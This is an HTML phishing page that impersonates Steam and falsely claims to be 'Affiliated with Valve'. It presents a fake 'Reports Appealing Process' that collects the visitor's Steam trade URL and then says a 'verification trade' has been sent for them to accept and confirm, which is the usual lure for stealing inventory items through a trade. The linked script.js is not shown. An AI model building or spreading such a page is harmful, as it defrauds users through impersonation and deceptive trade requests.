<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Steam Reports Appealing Process - Submit your appeal and verify your trade URL for validation. Ensure your Steam account's safety.">
    <meta name="keywords" content="Steam, Appeal, Reports, Trade URL, Verification, Steam Guard, Valve">
    <meta name="author" content="Your Name or Organization">
    <meta property="og:title" content="Steam Reports Appealing Process">
    <meta property="og:description" content="Submit your appeal and verify your trade URL for validation.">
    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ab/Valve_logo.svg/1200px-Valve_logo.svg.png">
    <meta property="og:url" content="YourWebsiteURLHere">
    
    <!-- Favicon -->
    <link rel="icon" href="https://steamcommunity.com/favicon.ico" type="image/x-icon">

    <title>Steam Reports Appealing Process</title>
    <link rel="stylesheet" href="style.css">
    <script src="script.js" defer></script>
</head>
<body>
    <img class="steam-logo" src="https://media.steampowered.com/apps/client/SteamGuard.png" alt="Steam Guard Logo">
    <div class="affiliated">
        Affiliated with <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ab/Valve_logo.svg/1200px-Valve_logo.svg.png" alt="Valve Logo">
    </div>
    <div class="container">
        <h1>Steam Reports Appealing Process</h1>
        <textarea id="appeal" placeholder="Type your appeal here..." onkeyup="checkInputs()"></textarea>
        <input type="text" id="tradeurl" placeholder="Attach your trade URL here for validation" onkeyup="checkInputs()">
        <button id="submitBtn" onclick="submitAppeal()">Submit Appeal & Start Verification</button>
    </div>
    <div class="loading">Please wait while your Appeal is being submitted and the verification is starting...</div>
    <div class="verification">
        <p>Verification trade has been sent, kindly accept and confirm to start your verification appeal.</p>
        <img src="https://cdn-icons-png.flaticon.com/512/845/845646.png" alt="Check Mark">
    </div>
</body>
</html>
